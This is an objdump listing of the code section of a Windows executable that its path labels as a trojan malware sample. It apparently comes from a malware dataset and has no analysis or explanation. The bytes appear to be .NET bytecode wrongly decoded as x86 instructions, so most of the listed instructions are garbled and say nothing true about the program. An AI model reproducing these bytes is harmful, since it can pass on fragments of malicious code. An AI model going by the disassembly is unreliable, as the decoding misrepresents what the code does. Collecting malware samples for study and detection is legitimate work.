
malware_samples/trojan/ddd36cf834fc7dca78f2d96e954e0949043c1c63aa268cfc18774e9875e63192.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402001:	42                   	inc    %edx
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 cc 28 00    	add    %al,0x28cc00
  402013:	00 f8                	add    %bh,%al
  402015:	18 00                	sbb    %al,(%eax)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 0d 00 00 06 00    	add    %cl,0x60000
	...
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 1a                	add    %bl,(%edx)
  402051:	7e 01                	jle    0x402054
  402053:	00 00                	add    %al,(%eax)
  402055:	04 2a                	add    $0x2a,%al
  402057:	1e                   	push   %ds
  402058:	02 80 01 00 00 04    	add    0x4000001(%eax),%al
  40205e:	2a 00                	sub    (%eax),%al
  402060:	13 30                	adc    (%eax),%esi
  402062:	07                   	pop    %es
  402063:	00 b7 00 00 00 01    	add    %dh,0x1000000(%edi)
  402069:	00 00                	add    %al,(%eax)
  40206b:	11 73 10             	adc    %esi,0x10(%ebx)
  40206e:	00 00                	add    %al,(%eax)
  402070:	0a 0a                	or     (%edx),%cl
  402072:	16                   	push   %ss
  402073:	0b 16                	or     (%esi),%edx
  402075:	0c 16                	or     $0x16,%al
  402077:	0d d0 05 00 00       	or     $0x5d0,%eax
  40207c:	02 28                	add    (%eax),%ch
  40207e:	11 00                	adc    %eax,(%eax)
  402080:	00 0a                	add    %cl,(%edx)
  402082:	28 12                	sub    %dl,(%edx)
  402084:	00 00                	add    %al,(%eax)
  402086:	0a 13                	or     (%ebx),%dl
  402088:	04 7e                	add    $0x7e,%al
  40208a:	13 00                	adc    (%eax),%eax
  40208c:	00 0a                	add    %cl,(%edx)
  40208e:	13 05 02 73 14 00    	adc    0x147302,%eax
  402094:	00 0a                	add    %cl,(%edx)
  402096:	17                   	pop    %ss
  402097:	12 05 15 12 01 12    	adc    0x12011215,%al
  40209d:	02 12                	add    (%edx),%dl
  40209f:	03 28                	add    (%eax),%ebp
  4020a1:	05 00 00 06 13       	add    $0x13060000,%eax
  4020a6:	06                   	push   %es
  4020a7:	11 06                	adc    %eax,(%esi)
  4020a9:	2d 4e 11 05 13       	sub    $0x1305114e,%eax
  4020ae:	07                   	pop    %es
  4020af:	16                   	push   %ss
  4020b0:	13 08                	adc    (%eax),%ecx
  4020b2:	2b 31                	sub    (%ecx),%esi
  4020b4:	11 07                	adc    %eax,(%edi)
  4020b6:	d0 05 00 00 02 28    	rolb   $1,0x28020000
  4020bc:	11 00                	adc    %eax,(%eax)
  4020be:	00 0a                	add    %cl,(%edx)
  4020c0:	28 15 00 00 0a a5    	sub    %dl,0xa50a0000
  4020c6:	05 00 00 02 13       	add    $0x13020000,%eax
  4020cb:	09 06                	or     %eax,(%esi)
  4020cd:	11 09                	adc    %ecx,(%ecx)
  4020cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4020d0:	16                   	push   %ss
  4020d1:	00 00                	add    %al,(%eax)
  4020d3:	0a 11                	or     (%ecx),%dl
  4020d5:	07                   	pop    %es
  4020d6:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4020d9:	17                   	pop    %ss
  4020da:	00 00                	add    %al,(%eax)
  4020dc:	0a 13                	or     (%ebx),%dl
  4020de:	07                   	pop    %es
  4020df:	11 08                	adc    %ecx,(%eax)
  4020e1:	17                   	pop    %ss
  4020e2:	58                   	pop    %eax
  4020e3:	13 08                	adc    (%eax),%ecx
  4020e5:	11 08                	adc    %ecx,(%eax)
  4020e7:	07                   	pop    %es
  4020e8:	32 ca                	xor    %dl,%cl
  4020ea:	11 05 28 04 00 00    	adc    %eax,0x428
  4020f0:	06                   	push   %es
  4020f1:	26 06                	es push %es
  4020f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4020f4:	18 00                	sbb    %al,(%eax)
  4020f6:	00 0a                	add    %cl,(%edx)
  4020f8:	2a 06                	sub    (%esi),%al
  4020fa:	72 01                	jb     0x4020fd
  4020fc:	00 00                	add    %al,(%eax)
  4020fe:	70 12                	jo     0x402112
  402100:	06                   	push   %es
  402101:	28 19                	sub    %bl,(%ecx)
  402103:	00 00                	add    %al,(%eax)
  402105:	0a 28                	or     (%eax),%ch
  402107:	1a 00                	sbb    (%eax),%al
  402109:	00 0a                	add    %cl,(%edx)
  40210b:	1f                   	pop    %ds
  40210c:	0a 7e 1b             	or     0x1b(%esi),%bh
  40210f:	00 00                	add    %al,(%eax)
  402111:	0a 73 0f             	or     0xf(%ebx),%dh
  402114:	00 00                	add    %al,(%eax)
  402116:	06                   	push   %es
  402117:	6f                   	outsl  %ds:(%esi),(%dx)
  402118:	16                   	push   %ss
  402119:	00 00                	add    %al,(%eax)
  40211b:	0a 06                	or     (%esi),%al
  40211d:	6f                   	outsl  %ds:(%esi),(%dx)
  40211e:	18 00                	sbb    %al,(%eax)
  402120:	00 0a                	add    %cl,(%edx)
  402122:	2a 00                	sub    (%eax),%al
  402124:	1b 30                	sbb    (%eax),%esi
  402126:	02 00                	add    (%eax),%al
  402128:	4d                   	dec    %ebp
  402129:	00 00                	add    %al,(%eax)
  40212b:	00 02                	add    %al,(%edx)
  40212d:	00 00                	add    %al,(%eax)
  40212f:	11 73 1c             	adc    %esi,0x1c(%ebx)
  402132:	00 00                	add    %al,(%eax)
  402134:	0a 0a                	or     (%edx),%cl
  402136:	28 1d 00 00 0a 6f    	sub    %bl,0x6f0a0000
  40213c:	1e                   	push   %ds
  40213d:	00 00                	add    %al,(%eax)
  40213f:	0a 6f 1f             	or     0x1f(%edi),%ch
  402142:	00 00                	add    %al,(%eax)
  402144:	0a 0b                	or     (%ebx),%cl
  402146:	2b 13                	sub    (%ebx),%edx
  402148:	07                   	pop    %es
  402149:	6f                   	outsl  %ds:(%esi),(%dx)
  40214a:	20 00                	and    %al,(%eax)
  40214c:	00 0a                	add    %cl,(%edx)
  40214e:	74 15                	je     0x402165
  402150:	00 00                	add    %al,(%eax)
  402152:	01 0c 06             	add    %ecx,(%esi,%eax,1)
  402155:	08 6f 21             	or     %ch,0x21(%edi)
  402158:	00 00                	add    %al,(%eax)
  40215a:	0a 07                	or     (%edi),%al
  40215c:	6f                   	outsl  %ds:(%esi),(%dx)
  40215d:	22 00                	and    (%eax),%al
  40215f:	00 0a                	add    %cl,(%edx)
  402161:	2d e5 de 11 07       	sub    $0x711dee5,%eax
  402166:	75 17                	jne    0x40217f
  402168:	00 00                	add    %al,(%eax)
  40216a:	01 0d 09 2c 06 09    	add    %ecx,0x9062c09
  402170:	6f                   	outsl  %ds:(%esi),(%dx)
  402171:	23 00                	and    (%eax),%eax
  402173:	00 0a                	add    %cl,(%edx)
  402175:	dc de                	(bad)
  402177:	03 26                	add    (%esi),%esp
  402179:	de 00                	fiadds (%eax)
  40217b:	06                   	push   %es
  40217c:	2a 00                	sub    (%eax),%al
  40217e:	00 00                	add    %al,(%eax)
  402180:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402183:	00 02                	add    %al,(%edx)
  402185:	00 16                	add    %dl,(%esi)
  402187:	00 1f                	add    %bl,(%edi)
  402189:	35 00 11 00 00       	xor    $0x1100,%eax
  40218e:	00 00                	add    %al,(%eax)
  402190:	00 00                	add    %al,(%eax)
  402192:	06                   	push   %es
  402193:	00 42 48             	add    %al,0x48(%edx)
  402196:	00 03                	add    %al,(%ebx)
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 01                	add    %al,(%ecx)
  40219c:	1b 30                	sbb    (%eax),%esi
  40219e:	03 00                	add    (%eax),%eax
  4021a0:	6a 00                	push   $0x0
  4021a2:	00 00                	add    %al,(%eax)
  4021a4:	03 00                	add    (%eax),%eax
  4021a6:	00 11                	add    %dl,(%ecx)
  4021a8:	02 6f 24             	add    0x24(%edi),%ch
  4021ab:	00 00                	add    %al,(%eax)
  4021ad:	0a 0a                	or     (%edx),%cl
  4021af:	2b 47 12             	sub    0x12(%edi),%eax
  4021b2:	00 28                	add    %ch,(%eax)
  4021b4:	25 00 00 0a 0b       	and    $0xb0a0000,%eax
  4021b9:	07                   	pop    %es
  4021ba:	28 26                	sub    %ah,(%esi)
  4021bc:	00 00                	add    %al,(%eax)
  4021be:	0a 0c 16             	or     (%esi,%edx,1),%cl
  4021c1:	0d 2b 29 08 09       	or     $0x908292b,%eax
  4021c6:	9a 13 04 11 04 6f 27 	lcall  $0x276f,$0x4110413
  4021cd:	00 00                	add    %al,(%eax)
  4021cf:	0a 72 0f             	or     0xf(%edx),%dh
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	70 6f                	jo     0x402245
  4021d6:	28 00                	sub    %al,(%eax)
  4021d8:	00 0a                	add    %cl,(%edx)
  4021da:	2d 0d 72 13 00       	sub    $0x13720d,%eax
  4021df:	00 70 07             	add    %dh,0x7(%eax)
  4021e2:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4021e5:	29 00                	sub    %eax,(%eax)
  4021e7:	00 0a                	add    %cl,(%edx)
  4021e9:	09 17                	or     %edx,(%edi)
  4021eb:	58                   	pop    %eax
  4021ec:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4021f1:	32 d1                	xor    %cl,%dl
  4021f3:	de 03                	fiadds (%ebx)
  4021f5:	26 de 00             	fiadds %es:(%eax)
  4021f8:	12 00                	adc    (%eax),%al
  4021fa:	28 2a                	sub    %ch,(%edx)
  4021fc:	00 00                	add    %al,(%eax)
  4021fe:	0a 2d b0 de 0e 12    	or     0x120edeb0,%ch
  402204:	00 fe                	add    %bh,%dh
  402206:	16                   	push   %ss
  402207:	04 00                	add    $0x0,%al
  402209:	00 1b                	add    %bl,(%ebx)
  40220b:	6f                   	outsl  %ds:(%esi),(%dx)
  40220c:	23 00                	and    (%eax),%eax
  40220e:	00 0a                	add    %cl,(%edx)
  402210:	dc 2a                	fsubrl (%edx)
  402212:	00 00                	add    %al,(%eax)
  402214:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402217:	00 00                	add    %al,(%eax)
  402219:	00 11                	add    %dl,(%ecx)
  40221b:	00 3c 4d 00 03 1a 00 	add    %bh,0x1a0300(,%ecx,2)
  402222:	00 01                	add    %al,(%ecx)
  402224:	02 00                	add    (%eax),%al
  402226:	07                   	pop    %es
  402227:	00 54 5b 00          	add    %dl,0x0(%ebx,%ebx,2)
  40222b:	0e                   	push   %cs
  40222c:	00 00                	add    %al,(%eax)
  40222e:	00 00                	add    %al,(%eax)
  402230:	1b 30                	sbb    (%eax),%esi
  402232:	05 00 2c 01 00       	add    $0x12c00,%eax
  402237:	00 04 00             	add    %al,(%eax,%eax,1)
  40223a:	00 11                	add    %dl,(%ecx)
  40223c:	73 2b                	jae    0x402269
  40223e:	00 00                	add    %al,(%eax)
  402240:	0a 0a                	or     (%edx),%cl
  402242:	28 07                	sub    %al,(%edi)
  402244:	00 00                	add    %al,(%eax)
  402246:	06                   	push   %es
  402247:	0b 07                	or     (%edi),%eax
  402249:	6f                   	outsl  %ds:(%esi),(%dx)
  40224a:	2c 00                	sub    $0x0,%al
  40224c:	00 0a                	add    %cl,(%edx)
  40224e:	16                   	push   %ss
  40224f:	3e 08 01             	or     %al,%ds:(%ecx)
  402252:	00 00                	add    %al,(%eax)
  402254:	28 1d 00 00 0a 26    	sub    %bl,0x260a0000
  40225a:	28 2d 00 00 0a 6f    	sub    %ch,0x6f0a0000
  402260:	2e 00 00             	add    %al,%cs:(%eax)
  402263:	0a 17                	or     (%edi),%dl
  402265:	8d 2d 00 00 01 25    	lea    0x25010000,%ebp
  40226b:	16                   	push   %ss
  40226c:	1f                   	pop    %ds
  40226d:	5c                   	pop    %esp
  40226e:	9d                   	popf
  40226f:	6f                   	outsl  %ds:(%esi),(%dx)
  402270:	2f                   	das
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 17                	or     (%edi),%dl
  402275:	9a 26 72 25 00 00 70 	lcall  $0x7000,$0x257226
  40227c:	07                   	pop    %es
  40227d:	16                   	push   %ss
  40227e:	6f                   	outsl  %ds:(%esi),(%dx)
  40227f:	30 00                	xor    %al,(%eax)
  402281:	00 0a                	add    %cl,(%edx)
  402283:	28 31                	sub    %dh,(%ecx)
  402285:	00 00                	add    %al,(%eax)
  402287:	0a 73 32             	or     0x32(%ebx),%dh
  40228a:	00 00                	add    %al,(%eax)
  40228c:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40228f:	73 33                	jae    0x4022c4
  402291:	00 00                	add    %al,(%eax)
  402293:	0a 0d 09 72 3b 00    	or     0x3b7209,%cl
  402299:	00 70 6f             	add    %dh,0x6f(%eax)
  40229c:	34 00                	xor    $0x0,%al
  40229e:	00 0a                	add    %cl,(%edx)
  4022a0:	09 16                	or     %edx,(%esi)
  4022a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a3:	35 00 00 0a 09       	xor    $0x90a0000,%eax
  4022a8:	20 fa                	and    %bh,%dl
  4022aa:	00 00                	add    %al,(%eax)
  4022ac:	00 6f 36             	add    %ch,0x36(%edi)
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	0a 09                	or     (%ecx),%cl
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	37                   	aaa
  4022b5:	00 00                	add    %al,(%eax)
  4022b7:	0a 72 69             	or     0x69(%edx),%dh
  4022ba:	00 00                	add    %al,(%eax)
  4022bc:	70 6f                	jo     0x40232d
  4022be:	38 00                	cmp    %al,(%eax)
  4022c0:	00 0a                	add    %cl,(%edx)
  4022c2:	26 09 6f 39          	or     %ebp,%es:0x39(%edi)
  4022c6:	00 00                	add    %al,(%eax)
  4022c8:	0a 6f 3a             	or     0x3a(%edi),%ch
  4022cb:	00 00                	add    %al,(%eax)
  4022cd:	0a 13                	or     (%ebx),%dl
  4022cf:	04 2b                	add    $0x2b,%al
  4022d1:	4d                   	dec    %ebp
  4022d2:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4022d5:	20 00                	and    %al,(%eax)
  4022d7:	00 0a                	add    %cl,(%edx)
  4022d9:	74 1d                	je     0x4022f8
  4022db:	00 00                	add    %al,(%eax)
  4022dd:	01 13                	add    %edx,(%ebx)
  4022df:	05 11 05 6f 3b       	add    $0x3b6f0511,%eax
  4022e4:	00 00                	add    %al,(%eax)
  4022e6:	0a 72 69             	or     0x69(%edx),%dh
  4022e9:	00 00                	add    %al,(%eax)
  4022eb:	70 6f                	jo     0x40235c
  4022ed:	3c 00                	cmp    $0x0,%al
  4022ef:	00 0a                	add    %cl,(%edx)
  4022f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4022f2:	3d 00 00 0a 16       	cmp    $0x160a0000,%eax
  4022f7:	31 26                	xor    %esp,(%esi)
  4022f9:	11 05 6f 3b 00 00    	adc    %eax,0x3b6f
  4022ff:	0a 72 69             	or     0x69(%edx),%dh
  402302:	00 00                	add    %al,(%eax)
  402304:	70 6f                	jo     0x402375
  402306:	3c 00                	cmp    $0x0,%al
  402308:	00 0a                	add    %cl,(%edx)
  40230a:	16                   	push   %ss
  40230b:	6f                   	outsl  %ds:(%esi),(%dx)
  40230c:	3e 00 00             	add    %al,%ds:(%eax)
  40230f:	0a 74 26 00          	or     0x0(%esi,%eiz,1),%dh
  402313:	00 01                	add    %al,(%ecx)
  402315:	13 06                	adc    (%esi),%eax
  402317:	06                   	push   %es
  402318:	11 06                	adc    %eax,(%esi)
  40231a:	6f                   	outsl  %ds:(%esi),(%dx)
  40231b:	3f                   	aas
  40231c:	00 00                	add    %al,(%eax)
  40231e:	0a 11                	or     (%ecx),%dl
  402320:	04 6f                	add    $0x6f,%al
  402322:	22 00                	and    (%eax),%al
  402324:	00 0a                	add    %cl,(%edx)
  402326:	2d aa de 15 11       	sub    $0x1115deaa,%eax
  40232b:	04 75                	add    $0x75,%al
  40232d:	17                   	pop    %ss
  40232e:	00 00                	add    %al,(%eax)
  402330:	01 13                	add    %edx,(%ebx)
  402332:	07                   	pop    %es
  402333:	11 07                	adc    %eax,(%edi)
  402335:	2c 07                	sub    $0x7,%al
  402337:	11 07                	adc    %eax,(%edi)
  402339:	6f                   	outsl  %ds:(%esi),(%dx)
  40233a:	23 00                	and    (%eax),%eax
  40233c:	00 0a                	add    %cl,(%edx)
  40233e:	dc de                	(bad)
  402340:	0a 09                	or     (%ecx),%cl
  402342:	2c 06                	sub    $0x6,%al
  402344:	09 6f 23             	or     %ebp,0x23(%edi)
  402347:	00 00                	add    %al,(%eax)
  402349:	0a dc                	or     %ah,%bl
  40234b:	de 0a                	fimuls (%edx)
  40234d:	08 2c 06             	or     %ch,(%esi,%eax,1)
  402350:	08 6f 23             	or     %ch,0x23(%edi)
  402353:	00 00                	add    %al,(%eax)
  402355:	0a dc                	or     %ah,%bl
  402357:	de 0d 26 de 0a 72    	fimuls 0x720ade26
  40235d:	73 00                	jae    0x40235f
  40235f:	00 70 28             	add    %dh,0x28(%eax)
  402362:	40                   	inc    %eax
  402363:	00 00                	add    %al,(%eax)
  402365:	0a 06                	or     (%esi),%al
  402367:	2a 41 64             	sub    0x64(%ecx),%al
  40236a:	00 00                	add    %al,(%eax)
  40236c:	02 00                	add    (%eax),%al
  40236e:	00 00                	add    %al,(%eax)
  402370:	94                   	xchg   %eax,%esp
  402371:	00 00                	add    %al,(%eax)
  402373:	00 5a 00             	add    %bl,0x0(%edx)
  402376:	00 00                	add    %al,(%eax)
  402378:	ee                   	out    %al,(%dx)
  402379:	00 00                	add    %al,(%eax)
  40237b:	00 15 00 00 00 00    	add    %dl,0x0
  402381:	00 00                	add    %al,(%eax)
  402383:	00 02                	add    %al,(%edx)
  402385:	00 00                	add    %al,(%eax)
  402387:	00 59 00             	add    %bl,0x0(%ecx)
  40238a:	00 00                	add    %al,(%eax)
  40238c:	ac                   	lods   %ds:(%esi),%al
  40238d:	00 00                	add    %al,(%eax)
  40238f:	00 05 01 00 00 0a    	add    %al,0xa000001
  402395:	00 00                	add    %al,(%eax)
  402397:	00 00                	add    %al,(%eax)
  402399:	00 00                	add    %al,(%eax)
  40239b:	00 02                	add    %al,(%edx)
  40239d:	00 00                	add    %al,(%eax)
  40239f:	00 52 00             	add    %dl,0x0(%edx)
  4023a2:	00 00                	add    %al,(%eax)
  4023a4:	bf 00 00 00 11       	mov    $0x11000000,%edi
  4023a9:	01 00                	add    %eax,(%eax)
  4023ab:	00 0a                	add    %cl,(%edx)
	...
  4023b5:	00 00                	add    %al,(%eax)
  4023b7:	00 18                	add    %bl,(%eax)
  4023b9:	00 00                	add    %al,(%eax)
  4023bb:	00 05 01 00 00 1d    	add    %al,0x1d000001
  4023c1:	01 00                	add    %eax,(%eax)
  4023c3:	00 03                	add    %al,(%ebx)
  4023c5:	00 00                	add    %al,(%eax)
  4023c7:	00 10                	add    %dl,(%eax)
  4023c9:	00 00                	add    %al,(%eax)
  4023cb:	01 1b                	add    %ebx,(%ebx)
  4023cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4023d0:	e5 01                	in     $0x1,%eax
  4023d2:	00 00                	add    %al,(%eax)
  4023d4:	05 00 00 11 18       	add    $0x18110000,%eax
  4023d9:	8d 26                	lea    (%esi),%esp
  4023db:	00 00                	add    %al,(%eax)
  4023dd:	01 25 16 72 d9 00    	add    %esp,0xd97216
  4023e3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4023e6:	25 17 72 eb 00       	and    $0xeb7217,%eax
  4023eb:	00 70 a2             	add    %dh,-0x5e(%eax)
  4023ee:	0a 02                	or     (%edx),%al
  4023f0:	28 06                	sub    %al,(%esi)
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	06                   	push   %es
  4023f5:	0b 07                	or     (%edi),%eax
  4023f7:	8e 39                	mov    (%ecx),%?
  4023f9:	bf 01 00 00 73       	mov    $0x73000001,%edi
  4023fe:	2b 00                	sub    (%eax),%eax
  402400:	00 0a                	add    %cl,(%edx)
  402402:	0c 73                	or     $0x73,%al
  402404:	2b 00                	sub    (%eax),%eax
  402406:	00 0a                	add    %cl,(%edx)
  402408:	0d 07 13 04 16       	or     $0x16041307,%eax
  40240d:	13 05 2b 57 11 04    	adc    0x411572b,%eax
  402413:	11 05 a3 05 00 00    	adc    %eax,0x5a3
  402419:	02 13                	add    (%ebx),%dl
  40241b:	06                   	push   %es
  40241c:	72 fb                	jb     0x402419
  40241e:	00 00                	add    %al,(%eax)
  402420:	70 02                	jo     0x402424
  402422:	11 06                	adc    %eax,(%esi)
  402424:	7b 0a                	jnp    0x402430
  402426:	00 00                	add    %al,(%eax)
  402428:	04 28                	add    $0x28,%al
  40242a:	41                   	inc    %ecx
  40242b:	00 00                	add    %al,(%eax)
  40242d:	0a 28                	or     (%eax),%ch
  40242f:	42                   	inc    %edx
  402430:	00 00                	add    %al,(%eax)
  402432:	0a 26                	or     (%esi),%ah
  402434:	08 11                	or     %dl,(%ecx)
  402436:	06                   	push   %es
  402437:	7b 0a                	jnp    0x402443
  402439:	00 00                	add    %al,(%eax)
  40243b:	04 6f                	add    $0x6f,%al
  40243d:	3f                   	aas
  40243e:	00 00                	add    %al,(%eax)
  402440:	0a de                	or     %dh,%bl
  402442:	1f                   	pop    %ds
  402443:	26 06                	es push %es
  402445:	11 06                	adc    %eax,(%esi)
  402447:	7b 0a                	jnp    0x402453
  402449:	00 00                	add    %al,(%eax)
  40244b:	04 28                	add    $0x28,%al
  40244d:	01 00                	add    %eax,(%eax)
  40244f:	00 2b                	add    %ch,(%ebx)
  402451:	2d 0d 09 11 06       	sub    $0x611090d,%eax
  402456:	7b 0a                	jnp    0x402462
  402458:	00 00                	add    %al,(%eax)
  40245a:	04 6f                	add    $0x6f,%al
  40245c:	3f                   	aas
  40245d:	00 00                	add    %al,(%eax)
  40245f:	0a de                	or     %dh,%bl
  402461:	00 11                	add    %dl,(%ecx)
  402463:	05 17 58 13 05       	add    $0x5135817,%eax
  402468:	11 05 11 04 8e 69    	adc    %eax,0x698e0411
  40246e:	32 a1 09 6f 44 00    	xor    0x446f09(%ecx),%ah
  402474:	00 0a                	add    %cl,(%edx)
  402476:	16                   	push   %ss
  402477:	30 0c 08             	xor    %cl,(%eax,%ecx,1)
  40247a:	6f                   	outsl  %ds:(%esi),(%dx)
  40247b:	44                   	inc    %esp
  40247c:	00 00                	add    %al,(%eax)
  40247e:	0a 16                	or     (%esi),%dl
  402480:	3e 37                	ds aaa
  402482:	01 00                	add    %eax,(%eax)
  402484:	00 03                	add    %al,(%ebx)
  402486:	2c 70                	sub    $0x70,%al
  402488:	08 6f 44             	or     %ch,0x44(%edi)
  40248b:	00 00                	add    %al,(%eax)
  40248d:	0a 16                	or     (%esi),%dl
  40248f:	3e 28 01             	sub    %al,%ds:(%ecx)
  402492:	00 00                	add    %al,(%eax)
  402494:	72 0f                	jb     0x4024a5
  402496:	01 00                	add    %eax,(%eax)
  402498:	70 02                	jo     0x40249c
  40249a:	28 31                	sub    %dh,(%ecx)
  40249c:	00 00                	add    %al,(%eax)
  40249e:	0a 13                	or     (%ebx),%dl
  4024a0:	07                   	pop    %es
  4024a1:	11 07                	adc    %eax,(%edi)
  4024a3:	72 31                	jb     0x4024d6
  4024a5:	01 00                	add    %eax,(%eax)
  4024a7:	70 28                	jo     0x4024d1
  4024a9:	1a 00                	sbb    (%eax),%al
  4024ab:	00 0a                	add    %cl,(%edx)
  4024ad:	13 07                	adc    (%edi),%eax
  4024af:	08 6f 24             	or     %ch,0x24(%edi)
  4024b2:	00 00                	add    %al,(%eax)
  4024b4:	0a 13                	or     (%ebx),%dl
  4024b6:	08 2b                	or     %ch,(%ebx)
  4024b8:	1e                   	push   %ds
  4024b9:	12 08                	adc    (%eax),%cl
  4024bb:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  4024c1:	09 11                	or     %edx,(%ecx)
  4024c3:	07                   	pop    %es
  4024c4:	72 69                	jb     0x40252f
  4024c6:	01 00                	add    %eax,(%eax)
  4024c8:	70 11                	jo     0x4024db
  4024ca:	09 28                	or     %ebp,(%eax)
  4024cc:	31 00                	xor    %eax,(%eax)
  4024ce:	00 0a                	add    %cl,(%edx)
  4024d0:	28 1a                	sub    %bl,(%edx)
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	0a 13                	or     (%ebx),%dl
  4024d6:	07                   	pop    %es
  4024d7:	12 08                	adc    (%eax),%cl
  4024d9:	28 2a                	sub    %ch,(%edx)
  4024db:	00 00                	add    %al,(%eax)
  4024dd:	0a 2d d9 de 0e 12    	or     0x120eded9,%ch
  4024e3:	08 fe                	or     %bh,%dh
  4024e5:	16                   	push   %ss
  4024e6:	04 00                	add    $0x0,%al
  4024e8:	00 1b                	add    %bl,(%ebx)
  4024ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4024eb:	23 00                	and    (%eax),%eax
  4024ed:	00 0a                	add    %cl,(%edx)
  4024ef:	dc 11                	fcoml  (%ecx)
  4024f1:	07                   	pop    %es
  4024f2:	28 40 00             	sub    %al,0x0(%eax)
  4024f5:	00 0a                	add    %cl,(%edx)
  4024f7:	2a 72 0f             	sub    0xf(%edx),%dh
  4024fa:	01 00                	add    %eax,(%eax)
  4024fc:	70 02                	jo     0x402500
  4024fe:	28 31                	sub    %dh,(%ecx)
  402500:	00 00                	add    %al,(%eax)
  402502:	0a 13                	or     (%ebx),%dl
  402504:	0a 09                	or     (%ecx),%cl
  402506:	6f                   	outsl  %ds:(%esi),(%dx)
  402507:	44                   	inc    %esp
  402508:	00 00                	add    %al,(%eax)
  40250a:	0a 16                	or     (%esi),%dl
  40250c:	31 4f 11             	xor    %ecx,0x11(%edi)
  40250f:	0a 72 77             	or     0x77(%edx),%dh
  402512:	01 00                	add    %eax,(%eax)
  402514:	70 28                	jo     0x40253e
  402516:	1a 00                	sbb    (%eax),%al
  402518:	00 0a                	add    %cl,(%edx)
  40251a:	13 0a                	adc    (%edx),%ecx
  40251c:	09 6f 24             	or     %ebp,0x24(%edi)
  40251f:	00 00                	add    %al,(%eax)
  402521:	0a 13                	or     (%ebx),%dl
  402523:	08 2b                	or     %ch,(%ebx)
  402525:	1e                   	push   %ds
  402526:	12 08                	adc    (%eax),%cl
  402528:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  40252e:	0b 11                	or     (%ecx),%edx
  402530:	0a 72 69             	or     0x69(%edx),%dh
  402533:	01 00                	add    %eax,(%eax)
  402535:	70 11                	jo     0x402548
  402537:	0b 28                	or     (%eax),%ebp
  402539:	31 00                	xor    %eax,(%eax)
  40253b:	00 0a                	add    %cl,(%edx)
  40253d:	28 1a                	sub    %bl,(%edx)
  40253f:	00 00                	add    %al,(%eax)
  402541:	0a 13                	or     (%ebx),%dl
  402543:	0a 12                	or     (%edx),%dl
  402545:	08 28                	or     %ch,(%eax)
  402547:	2a 00                	sub    (%eax),%al
  402549:	00 0a                	add    %cl,(%edx)
  40254b:	2d d9 de 0e 12       	sub    $0x120eded9,%eax
  402550:	08 fe                	or     %bh,%dh
  402552:	16                   	push   %ss
  402553:	04 00                	add    $0x0,%al
  402555:	00 1b                	add    %bl,(%ebx)
  402557:	6f                   	outsl  %ds:(%esi),(%dx)
  402558:	23 00                	and    (%eax),%eax
  40255a:	00 0a                	add    %cl,(%edx)
  40255c:	dc 08                	fmull  (%eax)
  40255e:	6f                   	outsl  %ds:(%esi),(%dx)
  40255f:	44                   	inc    %esp
  402560:	00 00                	add    %al,(%eax)
  402562:	0a 16                	or     (%esi),%dl
  402564:	31 4f 11             	xor    %ecx,0x11(%edi)
  402567:	0a 72 31             	or     0x31(%edx),%dh
  40256a:	01 00                	add    %eax,(%eax)
  40256c:	70 28                	jo     0x402596
  40256e:	1a 00                	sbb    (%eax),%al
  402570:	00 0a                	add    %cl,(%edx)
  402572:	13 0a                	adc    (%edx),%ecx
  402574:	08 6f 24             	or     %ch,0x24(%edi)
  402577:	00 00                	add    %al,(%eax)
  402579:	0a 13                	or     (%ebx),%dl
  40257b:	08 2b                	or     %ch,(%ebx)
  40257d:	1e                   	push   %ds
  40257e:	12 08                	adc    (%eax),%cl
  402580:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  402586:	0c 11                	or     $0x11,%al
  402588:	0a 72 b3             	or     -0x4d(%edx),%dh
  40258b:	01 00                	add    %eax,(%eax)
  40258d:	70 11                	jo     0x4025a0
  40258f:	0c 28                	or     $0x28,%al
  402591:	31 00                	xor    %eax,(%eax)
  402593:	00 0a                	add    %cl,(%edx)
  402595:	28 1a                	sub    %bl,(%edx)
  402597:	00 00                	add    %al,(%eax)
  402599:	0a 13                	or     (%ebx),%dl
  40259b:	0a 12                	or     (%edx),%dl
  40259d:	08 28                	or     %ch,(%eax)
  40259f:	2a 00                	sub    (%eax),%al
  4025a1:	00 0a                	add    %cl,(%edx)
  4025a3:	2d d9 de 0e 12       	sub    $0x120eded9,%eax
  4025a8:	08 fe                	or     %bh,%dh
  4025aa:	16                   	push   %ss
  4025ab:	04 00                	add    $0x0,%al
  4025ad:	00 1b                	add    %bl,(%ebx)
  4025af:	6f                   	outsl  %ds:(%esi),(%dx)
  4025b0:	23 00                	and    (%eax),%eax
  4025b2:	00 0a                	add    %cl,(%edx)
  4025b4:	dc 11                	fcoml  (%ecx)
  4025b6:	0a 28                	or     (%eax),%ch
  4025b8:	40                   	inc    %eax
  4025b9:	00 00                	add    %al,(%eax)
  4025bb:	0a 2a                	or     (%edx),%ch
  4025bd:	00 00                	add    %al,(%eax)
